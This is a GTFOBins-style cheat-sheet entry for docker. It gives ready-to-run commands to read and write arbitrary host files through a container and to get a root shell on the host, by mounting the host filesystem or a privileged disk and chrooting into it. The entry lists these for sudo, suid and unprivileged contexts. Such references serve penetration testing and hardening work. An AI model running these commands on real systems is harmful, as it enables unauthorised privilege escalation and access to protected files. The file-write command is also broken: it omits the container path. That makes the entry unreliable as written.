---
type: gtfobin
name: docker
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# docker

## file-read

```bash
docker cp /path/to/input-file $CONTAINER_ID:input-file
docker cp $CONTAINER_ID:input-file /path/to/temp-file
cat /path/to/temp-file
```
_Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
echo DATA >/path/to/temp-file
docker cp /path/to/temp-file $CONTAINER_ID:temp-file
docker cp $CONTAINER_ID /path/to/output-file
```
_Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```
**Contexts:** sudo, suid, unprivileged

```bash
docker run --rm -it --privileged -u root alpine
mount /dev/sda1 /mnt/
ls -la /mnt/
chroot /mnt /bin/bash
```
_This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`._
**Contexts:** sudo, suid, unprivileged
